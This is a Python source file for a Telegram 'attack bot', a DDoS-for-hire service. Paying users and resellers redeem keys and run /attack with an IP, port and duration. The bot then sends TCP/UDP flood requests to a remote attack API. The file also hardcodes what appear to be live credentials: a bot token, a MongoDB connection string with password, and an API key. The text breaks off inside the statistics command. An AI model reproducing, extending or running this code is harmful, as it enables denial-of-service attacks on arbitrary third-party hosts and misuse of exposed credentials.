import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot import util as telebot_util
import threading
import re
from datetime import datetime, timedelta
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import secrets
import string
import os
import psutil
import platform
import html
from pymongo import MongoClient

# ================= CONFIG =================
BOT_TOKEN = "8657011803:AAH8VVvTEuDzJzJ8pJCaXon5KrrXyfIcfCs"
BOT_OWNER = 7896370578

MONGO_URI = "mongodb+srv://sovekenk_db_user:cfzrzP81mAphgZVl@hitler.5hi3gug.mongodb.net/?retryWrites=true&w=majority&appName=Hitler"
DB_NAME = "attack_bot"

DEFAULT_API_URL = "https://web-production-c4df.up.railway.app/api/v1/attack"
DEFAULT_API_KEY = "mcn4PKVsL7eZWDzM5X4jR44pa36O8DKbzcy6tkWOWKw"

DEFAULT_MAX_ATTACK_TIME = 300
DEFAULT_COOLDOWN = 80
DEFAULT_MAX_CONCURRENT = 55
PORT_BLOCK_DURATION = 7200  # 2 hours
# ==========================================

bot = telebot.TeleBot(BOT_TOKEN)

# MongoDB setup
client = MongoClient(MONGO_URI)
db = client[DB_NAME]

# Collections
groups_col = db["approved_groups"]
limits_col = db["group_limits"]
bans_col = db["banned_users"]
resellers_col = db["resellers"]
keys_col = db["keys"]
plans_col = db["user_plans"]
attack_logs_col = db["attack_logs"]
key_logs_col = db["key_logs"]
blocked_codes_col = db["blocked_codes"]
settings_col = db["settings"]
known_users_col = db["known_users"]
user_attack_history_col = db["user_attack_history"]
all_groups_col = db["all_groups"]
admins_col = db["admins"]            # NEW: admins collection
admin_logs_col = db["admin_logs"]    # NEW: admin action logs

# Initialize settings if not present
if settings_col.count_documents({}) == 0:
    settings_col.insert_one({
        "max_attack_time": DEFAULT_MAX_ATTACK_TIME,
        "cooldown": DEFAULT_COOLDOWN,
        "max_concurrent_attacks": DEFAULT_MAX_CONCURRENT,
        "port_protection": False,
        "feedback_system": False,
        "maintenance_mode": False,
        "maintenance_start_time": None,
        "api_url": DEFAULT_API_URL,
        "api_key": DEFAULT_API_KEY
    })

def get_setting(key, default=None):
    doc = settings_col.find_one()
    return doc.get(key, default) if doc else default

def update_setting(key, value):
    settings_col.update_one({}, {"$set": {key: value}}, upsert=True)

# ------------------ Helper Functions ------------------
def is_owner(user_id):
    return user_id == BOT_OWNER

def is_admin(user_id):
    """Check if user is an admin (owner is implicitly super-admin)."""
    return admins_col.count_documents({"_id": str(user_id)}) > 0

def is_admin_or_owner(user_id):
    return is_owner(user_id) or is_admin(user_id)

def log_admin_action(admin_id, action, details=None):
    admin_logs_col.insert_one({
        "timestamp": datetime.now().isoformat(),
        "admin_id": admin_id,
        "action": action,
        "details": details or ""
    })

def is_reseller(user_id):
    return resellers_col.count_documents({"_id": str(user_id)}) > 0

def is_approved_group(chat_id):
    return groups_col.count_documents({"_id": str(chat_id)}) > 0

def get_group_limits(chat_id):
    doc = limits_col.find_one({"_id": str(chat_id)})
    if doc:
        return doc.get("max_concurrent", 1), doc.get("max_time", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)), doc.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN))
    return 1, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN)

def is_banned(user_id):
    return bans_col.count_documents({"_id": str(user_id)}) > 0

def is_group(message):
    return message.chat.type in ['group', 'supergroup']

def record_known_user(user_id):
    known_users_col.update_one({"_id": str(user_id)}, {"$set": {"_id": str(user_id)}}, upsert=True)

def record_all_group(chat_id, title=""):
    all_groups_col.update_one({"_id": str(chat_id)}, {"$set": {"title": title}}, upsert=True)

def has_valid_plan(user_id, send_expiry_msg=True):
    plan = plans_col.find_one({"_id": str(user_id)})
    if not plan:
        return False
    expires = plan.get("expires")
    if expires:
        expires_dt = datetime.fromisoformat(expires)
        if datetime.now() > expires_dt:
            code = plan.get("redeemed_code")
            reseller_info = ""
            if code:
                key = keys_col.find_one({"_id": code})
                if key:
                    created_by = key.get("created_by")
                    if created_by and is_reseller(created_by):
                        try:
                            reseller_chat = bot.get_chat(int(created_by))
                            if reseller_chat.username:
                                reseller_info = f" Contact @{reseller_chat.username} to renew."
                            else:
                                reseller_info = f" Contact reseller {created_by} to renew."
                        except:
                            reseller_info = f" Contact reseller {created_by} to renew."
            plans_col.delete_one({"_id": str(user_id)})
            if send_expiry_msg:
                try:
                    bot.send_message(user_id, f"❌ Your access has expired.{reseller_info}")
                except:
                    pass
            return False
    if plan.get("attacks_left", 0) == 0:
        return False
    return True

def is_master_key_user(user_id):
    plan = plans_col.find_one({"_id": str(user_id)})
    if plan:
        code = plan.get("redeemed_code")
        if code:
            key = keys_col.find_one({"_id": code})
            if key and key.get("type") == "master":
                return True
    return False

def get_user_limits(user_id):
    if is_owner(user_id):
        return 999999, 999999, 0
    plan = plans_col.find_one({"_id": str(user_id)})
    if plan:
        return 1, plan.get("max_duration", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)), plan.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN))
    return 1, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN)

def check_access(message):
    user_id = message.from_user.id

    if get_setting("maintenance_mode", False) and not is_owner(user_id):
        bot.reply_to(message, "🛠️ Bot is under maintenance. Please try again later.")
        return False

    if is_owner(user_id):
        return True

    if is_group(message):
        record_all_group(message.chat.id, message.chat.title or "")
        if not is_approved_group(message.chat.id):
            bot.reply_to(message, "🚫 This group is not approved!\nContact owner for approval.")
            return False
        if is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned! Contact owner.")
            return False
        return True

    if not is_group(message):
        record_known_user(user_id)
        if has_valid_plan(user_id):
            if is_banned(user_id):
                bot.reply_to(message, "🚫 You are banned! Contact owner.")
                return False
            return True
        else:
            bot.reply_to(message, "🚫 Unauthorized for Private Use\n\nYou need a valid key. Use /redeem <code> if you have one.")
            return False

    return False

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

# ------------------ Attack Concurrency (in-memory) ------------------
active_attacks = {}
user_cooldowns = {}
_attack_lock = threading.Lock()
live_status_trackers = {}

def get_user_cooldown(user_id):
    if is_owner(user_id):
        return 0
    with _attack_lock:
        if str(user_id) not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[str(user_id)]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[str(user_id)]
            return 0
        return int(remaining)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            del active_attacks[k]
        return len(active_attacks)

def get_group_active_attacks_count(chat_id):
    with _attack_lock:
        now = datetime.now()
        count = 0
        for attack in active_attacks.values():
            if attack['end_time'] <= now:
                continue
            if attack.get('chat_id') == chat_id and attack.get('chat_type') in ['group', 'supergroup']:
                count += 1
        return count

def get_user_active_attacks_in_group(user_id, chat_id):
    with _attack_lock:
        now = datetime.now()
        count = 0
        for attack in active_attacks.values():
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id and attack.get('chat_id') == chat_id:
                count += 1
        return count

def is_port_blocked(target, port):
    key = f"{target}:{port}"
    blocked = settings_col.find_one({"_id": "blocked_ports"}) or {}
    if key in blocked:
        block_time = datetime.strptime(blocked[key], '%d-%m-%Y %H:%M:%S')
        if (datetime.now() - block_time).total_seconds() < PORT_BLOCK_DURATION:
            remaining = PORT_BLOCK_DURATION - (datetime.now() - block_time).total_seconds()
            return True, int(remaining)
        else:
            del blocked[key]
            settings_col.update_one({"_id": "blocked_ports"}, {"$set": blocked}, upsert=True)
    return False, 0

def check_port_protection(user_id, target, port):
    if not get_setting("port_protection", False) or is_owner(user_id):
        return False, 0
    key = f"{target}:{port}"
    history = user_attack_history_col.find_one({"_id": str(user_id)})
    if history and key in history.get("targets", {}):
        last_attack = datetime.fromisoformat(history["targets"][key])
        elapsed = (datetime.now() - last_attack).total_seconds()
        if elapsed < PORT_BLOCK_DURATION:
            remaining = PORT_BLOCK_DURATION - elapsed
            return True, int(remaining)
    return False

# ================= MINIMAL API FALLBACK (15s timeout) =================
def execute_attack(target, port, duration):
    url = get_setting("api_url", DEFAULT_API_URL)
    api_key = get_setting("api_key", DEFAULT_API_KEY)
    headers = {"X-API-Key": api_key, "Content-Type": "application/json"}
    timeout = 15

    combos = [
        ("TCP", "vector"),
        ("TCP", "method"),
        ("UDP", "vector"),
    ]

    session = requests.Session()
    retries = Retry(total=1, backoff_factor=0.5, status_forcelist=[500,502,503,504], raise_on_status=False)
    session.mount('https://', HTTPAdapter(max_retries=retries))

    for method, field in combos:
        payload = {"ip": target, "port": port, "duration": duration, field: method}
        print(f"[DEBUG] Trying method={method}, field={field}")
        try:
            resp = session.post(url, json=payload, headers=headers, timeout=timeout)
            if resp.status_code == 200:
                print(f"[DEBUG] ✅ Success with {method}/{field}")
                return resp
            else:
                err = resp.text[:100] if resp.text else ""
                print(f"[DEBUG] Failed {resp.status_code}: {err}")
        except Exception as e:
            print(f"[DEBUG] Exception: {e}")
            continue

    class DummyResponse:
        def __init__(self):
            self.status_code = 500
            self.text = '{"message": "API server rejected all attempts", "success": false}'
    return DummyResponse()
# =====================================================

def start_attack(target, port, duration, message, attack_id, cooldown_seconds):
    try:
        user_id = message.from_user.id
        bot.reply_to(message, f"⚡ Attack Started!\n\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s\n📡 Using API\n\n📊 Check /status")

        attack_logs_col.insert_one({
            "timestamp": datetime.now().isoformat(),
            "user_id": user_id,
            "target": target,
            "port": port,
            "duration": duration,
            "status": "started",
            "chat_type": message.chat.type
        })

        response = execute_attack(target, port, duration)

        api_success = False
        if response.status_code == 200:
            api_success = True
            print(f"Attack sent successfully: {response.status_code}")
        else:
            error_detail = ""
            if hasattr(response, 'text') and response.text:
                try:
                    error_data = json.loads(response.text)
                    error_detail = f" - {error_data.get('message', response.text[:100])}"
                except:
                    error_detail = f" - {response.text[:100]}"
            print(f"[ERROR] API failure {response.status_code}{error_detail}")

        if api_success:
            with _attack_lock:
                if not is_owner(user_id):
                    user_cooldowns[str(user_id)] = datetime.now() + timedelta(seconds=duration + cooldown_seconds)

            time.sleep(duration)

            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]

            bot.reply_to(message, f"✅ Attack Complete!\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s\n⏳ Cooldown: {cooldown_seconds}s")
            attack_logs_col.insert_one({
                "timestamp": datetime.now().isoformat(),
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "status": "completed",
                "chat_type": message.chat.type
            })
        else:
            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]
            attack_logs_col.insert_one({
                "timestamp": datetime.now().isoformat(),
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "status": "failed",
                "chat_type": message.chat.type
            })

    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        print(f"Attack error: {e}")

# ------------------ Logging Helpers ------------------
def log_key_event(event_type, code, created_by=None, redeemed_by=None, extra=""):
    key_logs_col.insert_one({
        "timestamp": datetime.now().isoformat(),
        "event": event_type,
        "code": code,
        "created_by": created_by,
        "redeemed_by": redeemed_by,
        "extra": extra
    })

# ------------------ Key Generation Helpers ------------------
def generate_code(prefix="", length=8):
    chars = string.ascii_uppercase + string.digits
    random_part = ''.join(secrets.choice(chars) for _ in range(length))
    if prefix:
        return f"{prefix.upper()}-{random_part}"
    return random_part

# ------------------ Bot Commands ------------------
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if get_setting("maintenance_mode", False) and not is_owner(user_id):
        bot.reply_to(message, "🛠️ Bot is under maintenance. Please try again later.")
        return

    if not is_group(message):
        record_known_user(user_id)

    if is_group(message):
        record_all_group(message.chat.id, message.chat.title or "")

    if is_owner(user_id) and not is_group(message):
        bot.reply_to(message,
            "👑 <b>Welcome Owner!</b>\n\n"
            "🔹 /owner – View Owner Panel\n"
            "🔹 /state – View detailed statistics\n\n"
            "✨ <b>User Commands:</b>\n"
            "🎯 /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt; – Start attack\n"
            "📊 /status – View active attacks\n"
            "🏓 /ping – Check bot latency\n"
            "🆔 /id – Get your Telegram ID\n"
            "💬 /group_info – Get current group info (group only)\n"
            "🔑 /redeem &lt;code&gt; – Redeem a key (private only)\n"
            "📋 /check_my_access – View your plan details",
            parse_mode="HTML")
        return

    if is_reseller(user_id) and not is_group(message):
        bot.reply_to(message,
            "💼 <b>Welcome Reseller!</b>\n\n"
            "🔹 /reseller_panel – View Reseller Panel\n\n"
            "✨ <b>User Commands:</b>\n"
            "🎯 /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt; – Start attack\n"
            "📊 /status – View active attacks\n"
            "🏓 /ping – Check bot latency\n"
            "🆔 /id – Get your Telegram ID\n"
            "💬 /group_info – Get current group info (group only)\n"
            "🔑 /redeem &lt;code&gt; – Redeem a key (private only)\n"
            "📋 /check_my_access – View your plan details",
            parse_mode="HTML")
        return

    if is_group(message):
        if not is_approved_group(message.chat.id):
            bot.reply_to(message, "🚫 This group is not approved!\nContact owner for approval.")
            return
        bot.reply_to(message,
            "⚡ <b>Welcome!</b>\n\n"
            "🎯 /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt; – Start attack\n"
            "📊 /status – Active attacks\n"
            "❓ /help – Help",
            parse_mode="HTML")
        return

    if has_valid_plan(user_id):
        bot.reply_to(message,
            "⚡ <b>Welcome!</b> You have an active plan.\n\n"
            "🎯 /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt; – Start attack\n"
            "📊 /status – View active attacks\n"
            "🏓 /ping – Check bot latency\n"
            "🆔 /id – Get your Telegram ID\n"
            "🔑 /redeem &lt;code&gt; – Redeem a key\n"
            "📋 /check_my_access – View your plan details\n"
            "📢 /report &lt;message&gt; – Send feedback to owner\n"
            "❓ /help – Help",
            parse_mode="HTML")
    else:
        bot.reply_to(message, "🚫 Unauthorized for Private Use\n\nThis bot works in approved groups or with a valid key.\n\nUse /redeem &lt;code&gt; if you have one.",
                     parse_mode="HTML")

@bot.message_handler(commands=['ping'])
def ping_command(message):
    if not check_access(message):
        return
    start_time = time.time()
    sent = bot.reply_to(message, "🏓 Pong!")
    end_time = time.time()
    latency = int((end_time - start_time) * 1000)
    bot.edit_message_text(f"🏓 <b>Pong!</b> {latency}ms", chat_id=message.chat.id, message_id=sent.message_id, parse_mode="HTML")

@bot.message_handler(commands=['id'])
def id_command(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    chat_id = message.chat.id
    if is_group(message):
        bot.reply_to(message, f"🆔 Your ID: {user_id}\n💬 Group ID: {chat_id}", parse_mode="HTML")
    else:
        bot.reply_to(message, f"🆔 Your ID: {user_id}", parse_mode="HTML")

@bot.message_handler(commands=['group_info'])
def group_info_command(message):
    if not is_group(message):
        bot.reply_to(message, "⚠️ This command only works in groups.")
        return
    if not check_access(message):
        return
    chat = message.chat
    title = html.escape(chat.title) if chat.title else str(chat.id)
    info = f"📋 <b>Group Info:</b>\n\n📛 Name: {title}\n🆔 ID: {chat.id}\n👥 Type: {chat.type}"
    if chat.username:
        info += f"\n🔗 Username: @{html.escape(chat.username)}"
    bot.reply_to(message, info, parse_mode="HTML")

@bot.message_handler(commands=['check_my_access'])
def check_my_access(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    if is_group(message):
        if is_approved_group(message.chat.id):
            limits = get_group_limits(message.chat.id)
            bot.reply_to(message, f"✅ You are in an approved group.\n\nGroup limits: Max concurrent: {limits[0]}, Max time: {limits[1]}s, Cooldown: {limits[2]}s")
        else:
            bot.reply_to(message, "❌ This group is not approved.")
        return

    if is_owner(user_id):
        bot.reply_to(message, "👑 You are the owner. Unlimited access.")
        return

    plan = plans_col.find_one({"_id": str(user_id)})
    if not plan:
        bot.reply_to(message, "❌ You don't have an active plan. Redeem a key with /redeem &lt;code&gt;.")
        return

    expires = datetime.fromisoformat(plan["expires"])
    now = datetime.now()
    if now > expires:
        code = plan.get("redeemed_code")
        reseller_info = ""
        if code:
            key = keys_col.find_one({"_id": code})
            if key:
                created_by = key.get("created_by")
                if created_by and is_reseller(created_by):
                    try:
                        reseller_chat = bot.get_chat(int(created_by))
                        if reseller_chat.username:
                            reseller_info = f"\nContact @{reseller_chat.username} to renew."
                        else:
                            reseller_info = f"\nContact reseller {created_by} to renew."
                    except:
                        reseller_info = f"\nContact reseller {created_by} to renew."
        bot.reply_to(message, f"❌ Your plan has expired.{reseller_info}")
        return

    remaining_time = expires - now
    days = remaining_time.days
    hours = remaining_time.seconds // 3600
    minutes = (remaining_time.seconds % 3600) // 60

    text = f"📋 <b>Your Plan Details:</b>\n\n"
    text += f"🎯 Attacks: {'Unlimited' if plan['attacks_left'] == -1 else plan['attacks_left']}\n"
    text += f"⏱️ Max duration: {plan['max_duration']}s\n"
    text += f"⏳ Cooldown: {plan['cooldown']}s\n"
    text += f"📅 Expires in: {days}d {hours}h {minutes}m\n"
    text += f"📅 Expiry date: {expires.strftime('%Y-%m-%d %H:%M:%S')}"
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ Report System ------------------
@bot.message_handler(commands=['report'])
def report_command(message):
    if not check_access(message):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /report &lt;your message&gt;\nExample: /report Bot is slow", parse_mode="HTML")
        return
    report_text = html.escape(parts[1])
    user = message.from_user
    user_info = f"User: {user.id}"
    if user.username:
        user_info += f" (@{html.escape(user.username)})"
    elif user.first_name:
        user_info += f" ({html.escape(user.first_name)})"
    forward_msg = f"📢 <b>New Report</b>\n\n{user_info}\n\n📝 Message:\n{report_text}"
    try:
        bot.send_message(BOT_OWNER, forward_msg, parse_mode="HTML")
        bot.reply_to(message, "✅ Your report has been sent to the owner. Thank you!")
    except Exception as e:
        bot.reply_to(message, "❌ Failed to send report. Please try again later.")

# ------------------ Reseller Panel ------------------
@bot.message_handler(commands=['reseller_panel'])
def reseller_panel_cmd(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Only resellers can access this panel.")
        return

    reseller = resellers_col.find_one({"_id": str(user_id)})
    credits = reseller.get("credits", 0) if reseller else 0
    if is_owner(user_id):
        credits = "Unlimited"
    text = f"""💼 <b>Reseller Panel</b>

💰 <b>Your Credits:</b> {credits}

📋 <b>Commands:</b>
✨ /gen &lt;prefix&gt; &lt;days&gt; &lt;count&gt; – Generate unlimited keys (1 credit per day)
✨ /mycredit – Check your credit balance
✨ /keyreset &lt;code&gt; – Reset expiry of an unredeemed key (max 2 resets, extends original duration)
✨ /keyblock &lt;code&gt; – Block any key you generated (refund: days-2 if redeemed, full if unused)

📢 For support, contact owner."""
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['mycredit'])
def mycredit_cmd(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ You are not a reseller.")
        return
    if is_owner(user_id):
        bot.reply_to(message, "👑 Owner has unlimited credits.")
        return
    reseller = resellers_col.find_one({"_id": str(user_id)})
    credits = reseller.get("credits", 0) if reseller else 0
    bot.reply_to(message, f"💰 Your credit balance: <b>{credits}</b>", parse_mode="HTML")

# ------------------ Key Reset (Reseller) with 2 reset limit ------------------
@bot.message_handler(commands=['keyreset'])
def keyreset_command(message):
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Only resellers can use this command.")
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /keyreset &lt;code&gt;", parse_mode="HTML")
        return

    code = parts[1].upper()
    key = keys_col.find_one({"_id": code})
    if not key:
        bot.reply_to(message, "❌ Code not found.")
        return

    if not is_owner(user_id) and key.get("created_by") != user_id:
        bot.reply_to(message, "❌ You can only reset keys you generated.")
        return

    if key.get("redeemed_by"):
        bot.reply_to(message, "❌ Cannot reset a key that has already been redeemed.")
        return

    reset_count = key.get("reset_count", 0)
    if reset_count >= 2:
        bot.reply_to(message, "❌ This key has already been reset the maximum 2 times.")
        return

    original_days = key.get("duration_days")
    if not original_days:
        bot.reply_to(message, "❌ Original duration not recorded for this key.")
        return

    new_expires = datetime.now() + timedelta(days=original_days)
    keys_col.update_one({"_id": code}, {
        "$set": {"expires": new_expires.isoformat()},
        "$inc": {"reset_count": 1}
    })
    log_key_event("reset", code, created_by=user_id, extra=f"new_expiry={new_expires.isoformat()}, reset #{reset_count+1}")

    bot.reply_to(message,
        f"✅ Key {code} reset (#{reset_count+1}/2).\n"
        f"⏳ New expiry: {new_expires.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"🎯 Attacks: Unlimited\n"
        f"📅 Duration: {original_days} days",
        parse_mode="HTML")

# ------------------ Key Block with Refund (Reseller) - can block redeemed keys ------------------
@bot.message_handler(commands=['keyblock'])
def keyblock_command(message):
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Only resellers can use this command.")
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /keyblock &lt;code&gt;", parse_mode="HTML")
        return

    code = parts[1].upper()
    key = keys_col.find_one({"_id": code})
    if not key:
        bot.reply_to(message, "❌ Code not found.")
        return

    if not is_owner(user_id) and key.get("created_by") != user_id:
        bot.reply_to(message, "❌ You can only block keys you generated.")
        return

    original_days = key.get("duration_days", 0)
    if original_days <= 0:
        bot.reply_to(message, "❌ Invalid key duration, cannot refund.")
        return

    redeemed_by = key.get("redeemed_by")
    refund_days = original_days
    penalty_applied = False

    if redeemed_by:
        refund_days = max(0, original_days - 2)
        penalty_applied = True
        plans_col.delete_one({"_id": str(redeemed_by)})
        try:
            bot.send_message(redeemed_by, f"⚠️ Your access key {code} has been blocked by the reseller.")
        except:
            pass

    keys_col.delete_one({"_id": code})
    log_key_event("blocked by reseller", code, created_by=user_id, extra=f"refunded {refund_days} credits, redeemed={bool(redeemed_by)}")

    if not is_owner(user_id):
        if refund_days > 0:
            resellers_col.update_one({"_id": str(user_id)}, {"$inc": {"credits": refund_days}})
        new_credits = resellers_col.find_one({"_id": str(user_id)})["credits"]

        msg = f"🚫 Key {code} blocked.\n"
        if penalty_applied:
            msg += f"💰 <b>{refund_days} credit(s) refunded</b> (original {original_days} days minus 2-day penalty).\n"
        else:
            msg += f"💰 <b>{refund_days} credit(s) refunded</b> (full refund).\n"
        msg += f"💳 Your new balance: {new_credits}"
        bot.reply_to(message, msg, parse_mode="HTML")
    else:
        bot.reply_to(message, f"🚫 Key {code} blocked. (Owner – no credit refund needed)", parse_mode="HTML")

# ------------------ Admin Management Commands ------------------
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only command.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /addadmin &lt;user_id&gt;", parse_mode="HTML")
        return
    try:
        uid = int(parts[1])
        if is_admin(uid):
            bot.reply_to(message, "⚠️ User is already an admin.")
            return
        admins_col.insert_one({"_id": str(uid)})
        log_admin_action(message.from_user.id, "add_admin", f"Added admin {uid}")
        bot.reply_to(message, f"✅ User {uid} added as admin.", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ Invalid user ID!")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only command.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /removeadmin &lt;user_id&gt;", parse_mode="HTML")
        return
    try:
        uid = int(parts[1])
        if not is_admin(uid):
            bot.reply_to(message, "⚠️ User is not an admin.")
            return
        admins_col.delete_one({"_id": str(uid)})
        log_admin_action(message.from_user.id, "remove_admin", f"Removed admin {uid}")
        bot.reply_to(message, f"✅ User {uid} removed from admins.", parse_mode="HTML")
    except:
        bot.reply_to(message, "❌ Invalid user ID!")

@bot.message_handler(commands=['admins'])
def list_admins(message):
    if not is_admin_or_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner or admin only.")
        return
    admins = list(admins_col.find())
    if not admins:
        bot.reply_to(message, "📋 No admins.")
        return
    text = "👥 <b>Admins:</b>\n\n"
    for a in admins:
        uid = a["_id"]
        try:
            user = bot.get_chat(int(uid))
            username = f"@{user.username}" if user.username else "No username"
            name = html.escape(user.first_name or "")
        except:
            username = "Unknown"
            name = ""
        text += f"• {uid} | {username} | {name}\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['adminlogs'])
def admin_logs_command(message):
    if not is_admin_or_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner or admin only.")
        return
    parts = message.text.split()
    n = 10
    if len(parts) == 2:
        try:
            n = int(parts[1])
        except:
            pass
    logs = list(admin_logs_col.find().sort("timestamp", -1).limit(n))
    if not logs:
        bot.reply_to(message, "📋 No admin logs.")
        return
    text = f"📋 <b>Last {len(logs)} Admin Actions:</b>\n\n"
    for log in reversed(logs):
        ts = datetime.fromisoformat(log["timestamp"]).strftime("%m-%d %H:%M")
        text += f"• {ts} | Admin {log['admin_id']} | {log['action']}"
        if log.get("details"):
            text += f" | {log['details']}"
        text += "\n"
    bot.reply_to(message, text[:4000], parse_mode="HTML")

# ------------------ Owner Panel (with admin section) ------------------
@bot.message_handler(commands=['owner'])
def owner_panel(message):
    if not is_owner(message.from_user.id):
        return

    text = f"""👑 <b>OWNER PANEL</b>

Use /state for detailed statistics.

📋 <b>Commands:</b>

🔹 <b>Admin Management (NEW):</b>
• /addadmin &lt;user_id&gt; – Add an admin
• /removeadmin &lt;user_id&gt; – Remove an admin
• /admins – List admins
• /adminlogs [N] – Show recent admin actions

🔹 <b>Group Management:</b>
• /approve &lt;id&gt; &lt;max_concurrent&gt; &lt;max_time&gt; &lt;cooldown&gt; – Approve group with custom limits
• /approve (in group) – Approve current group with defaults
• /disapprove – Remove current group
• /approved_groups – List all groups

🔹 <b>User Management:</b>
• /ban &lt;user_id&gt; – Ban user
• /unban &lt;user_id&gt; – Unban user
• /banned_list – List banned

🔹 <b>Reseller System:</b>
• /add_reseller &lt;user_id&gt; – Add reseller
• /remove_reseller &lt;user_id&gt; – Remove reseller (also deletes their generated keys)
• /resellers – List resellers
• /addcredit &lt;user_id&gt; &lt;amount&gt; – Add credits
• /removecredit &lt;user_id&gt; &lt;amount&gt; – Remove credits
• /reseller_credits – Show all reseller credits
• /reseller_info &lt;id/username&gt; – View reseller details

🔹 <b>Key Generation (Owner):</b>
• /genkey &lt;max_duration&gt; &lt;cooldown&gt; &lt;days&gt; – Master key (unlimited attacks)
• /gentrial &lt;hours&gt; &lt;count&gt; – Generate multiple trial keys
• /gentrialfor &lt;reseller_id&gt; &lt;hours&gt; &lt;count&gt; – Trial keys for reseller
• /deletetrials – Delete unredeemed trial keys
• /deletealltrials – Delete ALL trial keys (used & unused)

🔹 <b>Reseller Key Generation:</b>
• /gen &lt;prefix&gt; &lt;days&gt; &lt;count&gt; – Generate unlimited keys (cost: days × count credits)

🔹 <b>Redeem (any user):</b>
• /redeem &lt;code&gt; – Redeem a key

🔹 <b>Smart Broadcast:</b>
• /broadcast all &lt;msg&gt; – Send to ALL known users AND all groups the bot is in (0.5s delay)
• /broadcast private_users &lt;msg&gt; – Send to private users with active plan
• /broadcast resellers &lt;msg&gt; – Send to all resellers
• /broadcast authorized_groups &lt;msg&gt; – Send to approved groups only
• Reply to a photo and use /broadcast all &lt;caption&gt; to send the photo.

🔹 <b>Statistics &amp; Logs:</b>
• /state – Show detailed statistics
• /view_logs [N] – View recent attack logs (default 10)
• /server_stats – Show server resource usage
• /view_code_logs [N] – View key generation/redeem logs
• /list_codes – List all active/unused codes
• /delete_code &lt;code&gt; – Delete a specific code
• /block_code &lt;code&gt; – Block a code (revokes access if already redeemed)
• /key_state &lt;code&gt; – Show detailed info about a code
• /private_users – List all private users with plan details
• /deletelogs_attack – Clear attack logs
• /deletelogs_key – Clear key logs
• /deletelogs_all – Clear both logs
• /export_data – Export all bot data (JSON)

🔹 <b>Time Management:</b>
• /extend_all_users &lt;seconds&gt; – Add time to all active plans
• /deduct_all &lt;seconds&gt; – Deduct time from all active plans
• /deduct_time &lt;code&gt; &lt;seconds&gt; – Remove time from a specific user's plan

🔹 <b>Settings:</b>
• /settime &lt;seconds&gt; – Global max time (updates all existing plans)
• /setcooldown &lt;seconds&gt; – Global cooldown (updates all existing plans)
• /setconcurrent &lt;number&gt; – Set global max concurrent attacks
• /setapi &lt;url&gt; &lt;key&gt; – Set the attack API endpoint and key
• /port_protection on/off – Toggle port protection
• /feedback on/off – Toggle feedback system
• /maintenance on/off – Toggle maintenance mode
• /block_port &lt;ip&gt; &lt;port&gt; – Block port
• /unblock_port &lt;ip&gt; &lt;port&gt; – Unblock port
• /blocked_ports – List blocked ports"""
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ /state command ------------------
@bot.message_handler(commands=['state'])
def state_command(message):
